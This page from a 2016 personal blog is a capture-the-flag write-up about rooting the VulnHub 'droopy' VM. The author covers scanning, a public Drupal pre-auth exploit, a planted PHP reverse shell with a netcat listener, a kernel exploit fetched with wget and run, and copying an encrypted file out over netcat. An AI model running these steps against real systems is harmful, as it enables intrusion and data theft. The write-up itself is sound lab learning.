@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <title>vulnhub droopy vm</title>
+  <meta name="description" content="Been a while since i played with vulnhub. So since yesterday i've been trying to break droopy, which i almost did ...So, the usual stuff:sudo netdiscover -r ...">
+
+  <link rel="stylesheet" href="/css/main.css">
+  <link rel="canonical" href="http://yourdomain.com/vulnhub/2016/05/26/vulnhub-droopy-vm.html">
+  <link rel="alternate" type="application/rss+xml" title="Imipious notes" href="http://yourdomain.com/feed.xml">
+</head>
+
+
+  <body>
+
+    <header class="site-header">
+
+  <div class="wrapper">
+
+    <a class="site-title" href="/">Imipious notes</a>
+
+    <nav class="site-nav">
+      <a href="#" class="menu-icon">
+        <svg viewBox="0 0 18 15">
+          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
+          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
+          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
+        </svg>
+      </a>
+
+      <div class="trigger">
+        
+          
+          <a class="page-link" href="/about/">About</a>
+          
+        
+          
+        
+          
+        
+          
+        
+      </div>
+    </nav>
+
+  </div>
+
+</header>
+
+
+    <div class="page-content">
+      <div class="wrapper">
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title" itemprop="name headline">vulnhub droopy vm</h1>
+    <p class="post-meta"><time datetime="2016-05-26T01:00:10+01:00" itemprop="datePublished">May 26, 2016</time></p>
+  </header>
+
+  <div class="post-content" itemprop="articleBody">
+    <p>Been a while since i played with vulnhub. So since yesterday i've been trying to break <a href="https://www.vulnhub.com/entry/droopy-v02,143/">droopy</a>, which i almost did ...
+<p>So, the usual stuff:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">sudo netdiscover -r 192.168.0.0/16</code></pre></figure>
+
+<p> My target is 192.168.1.89 .
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap -p- -sV 192.168.1.89</code></pre></figure>
+
+<p> Found a port 80 open. I followed it since it was the only one open and found a drupal website.
+<br />I tried to create a user no luck, i searched for something interesting in the sub-directories:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python wfuzz.py -c -z file,wordlist/general/common.txt --hc 404   http://192.168.1.89/FUZZ</code></pre></figure>
+
+<pre>
+==================================================================
+ID	Response   Lines      Word         Chars          Request
+==================================================================
+
+00385:  C=301      9 L	      28 W	    314 Ch	  "includes"
+00491:  C=301      9 L	      28 W	    310 Ch	  "misc"
+00499:  C=301      9 L	      28 W	    313 Ch	  "modules"
+00675:  C=301      9 L	      28 W	    313 Ch	  "scripts"
+00724:  C=301      9 L	      28 W	    311 Ch	  "sites"
+</pre>
+<p>... after a while decide to change and look for the drupal stuff. I found this gem <a href="https://github.com/droope/droopescan">droopescan</a> and found drupal 7.3 was in usage.
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">./droopescan  scan drupal -u http://192.168.1.88/ -t 8</code></pre></figure>
+
+<p>I don't usually ( at least i don't remember) hunt for exploits but his time this seemed a reasonable choice since it was an old version of drupal and i had no other ideia.
+<p>Found the exploit ... a pre-authentication one, wow. o.o !!
+<a href="https://www.exploit-db.com/exploits/34992/">the exploit</a>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">python 34992.py  -t http://192.168.1.88 -u impious -p impious</code></pre></figure>
+
+<p>User created.
+
+<p> So, in the admin panel after a while trying to add a "file uploader" to the article i saw an item saying to enable PHP to run. I wonder if this is commom usage in other CMS and similar, like wordpress and stuff... must check this.
+<br />In modules I set the PHP to ok and then set the possibility to add php code in 'articles'. Next, i created a new article and used this <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php reverse shell</a> pointing to my computer. With the usual suspect netcat for the win:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc -lnvvp 12344</code></pre></figure>
+
+I created an article with that PHP in the body!
+<p><b>shell!</b>
+
+<p>After fooling around in the server, moving around all directories i could remember,there was no commom user directories to see .bash_history and not much besides the mysql password with no further info in the database as well.
+I knew it was an old kernel, it's probably the first command i do whenever i connect to a server:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">uname -a</code></pre></figure>
+
+Old old kernel... then again, i had no clue what to do next so i choose the easy path:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nb">cd</span> /tmp
+wget https://www.kernel-exploits.com/media/ofs_64
+chmod +x ofs_64
+./ofs_64</code></pre></figure>
+
+<p><b>ROOT!</b> Oh!
+<p>Reading the email in /var/spool/mail/www-data and the help hints i knew i had to use rockyou passwordlist against something and found the encrypted file in:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">/root/dave.tc</code></pre></figure>
+
+<p>So copied the file with netcat to my computer:
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nc -lnvvp 12345 &gt; dave.tc
+nc 192.168.1.73 12345 &lt; dave.tc</code></pre></figure>
+
+<p>Well, then i gave up... i started cracking it with hashcat and went to do something else ... when i got back after 2 hours... no luck... wtf... i must have done something wrong.
+<p>I thought i did something wrong.. 2 exploits in one VM and still no flag?  Hm... so i went to check other people resolutions: it appears they filtered the rockyou by the word 'academy' ( from the email in /var/spool/mail/www-data)... <b>i would never do that, honestly.</b> I still fail to see that hint in the email :P . So then they mount the truecrypt and found the flag in an hidden folder.
+<p>Fun until root! :) After that i started wondering if what i was doing was ok, mainly those 2 exploits usage.
+</p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p></p>
+
+  </div>
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Imipious notes</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li><a href="mailto:d.impious@gmail.com">d.impious@gmail.com</a></li>
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-2">
+        <ul class="social-media-list">
+          
+          <li>
+            <a href="https://github.com/impious"><span class="icon icon--github"><svg viewBox="0 0 16 16"><path fill="#828282" d="M7.999,0.431c-4.285,0-7.76,3.474-7.76,7.761 c0,3.428,2.223,6.337,5.307,7.363c0.388,0.071,0.53-0.168,0.53-0.374c0-0.184-0.007-0.672-0.01-1.32 c-2.159,0.469-2.614-1.04-2.614-1.04c-0.353-0.896-0.862-1.135-0.862-1.135c-0.705-0.481,0.053-0.472,0.053-0.472 c0.779,0.055,1.189,0.8,1.189,0.8c0.692,1.186,1.816,0.843,2.258,0.645c0.071-0.502,0.271-0.843,0.493-1.037 C4.86,11.425,3.049,10.76,3.049,7.786c0-0.847,0.302-1.54,0.799-2.082C3.768,5.507,3.501,4.718,3.924,3.65 c0,0,0.652-0.209,2.134,0.796C6.677,4.273,7.34,4.187,8,4.184c0.659,0.003,1.323,0.089,1.943,0.261 c1.482-1.004,2.132-0.796,2.132-0.796c0.423,1.068,0.157,1.857,0.077,2.054c0.497,0.542,0.798,1.235,0.798,2.082 c0,2.981-1.814,3.637-3.543,3.829c0.279,0.24,0.527,0.713,0.527,1.437c0,1.037-0.01,1.874-0.01,2.129 c0,0.208,0.14,0.449,0.534,0.373c3.081-1.028,5.302-3.935,5.302-7.362C15.76,3.906,12.285,0.431,7.999,0.431z"/></svg>
+</span><span class="username">impious</span></a>
+
+          </li>
+          
+
+          
+        </ul>
+      </div>
+
+      <div class="footer-col footer-col-3">
+        <p></p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+
+
+  </body>
+
+</html>
